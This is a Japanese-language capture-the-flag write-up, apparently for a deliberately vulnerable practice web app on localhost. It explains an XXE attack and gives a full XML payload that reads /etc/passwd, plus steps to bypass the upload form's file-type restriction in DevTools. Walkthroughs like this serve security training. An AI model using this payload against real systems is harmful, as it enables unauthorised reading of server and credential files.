# XXE Data Access ✅

**難易度:** ⭐⭐⭐
**カテゴリ:** XXE
**目標:** サーバー上のファイルを読み取る

---

## 思考プロセス

**ステップ1: XMLアップロード機能を探す**
```
「Deprecated Interface チャレンジでXMLアップロードできた」
    ↓
「XMLを受け入れるなら、XXE攻撃ができるかも？」
    ↓
「XXE = XML内で外部エンティティを定義して、ファイルを読み込む攻撃」
```

**ステップ2: XXEペイロードの構築**
```
「まずDOCTYPE宣言でエンティティを定義」
    ↓
「<!ENTITY xxe SYSTEM "file:///etc/passwd"> で /etc/passwd を参照」
    ↓
「XML本文で &xxe; と書くと、ファイル内容に置換される」
```

## 実行手順

1. 以下の内容で `xxe.xml` というファイルを作成:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <stockCheck>
     <productId>&xxe;</productId>
   </stockCheck>
   ```
2. `http://localhost:3000/#/complain` にアクセス
3. DevTools で `accept` 属性を変更してXMLをアップロード可能にする
4. 作成したXMLファイルをアップロード
5. レスポンスに `/etc/passwd` の内容が含まれる

## 解説

**XXEとは？**
- XML External Entity の略
- XMLファイル内で外部ファイルを参照する機能を悪用する攻撃

**なぜ /etc/passwd ？**
- Linux/Unix系サーバーなら必ず存在
- 誰でも読み取り可能なファイル
- XXEが成功すれば他のファイルも読める

## 関連チャレンジ

- [Deprecated Interface](../difficulty-2/deprecated-interface.md)
- [XXE DoS](../difficulty-5-6/xxe-dos.md)
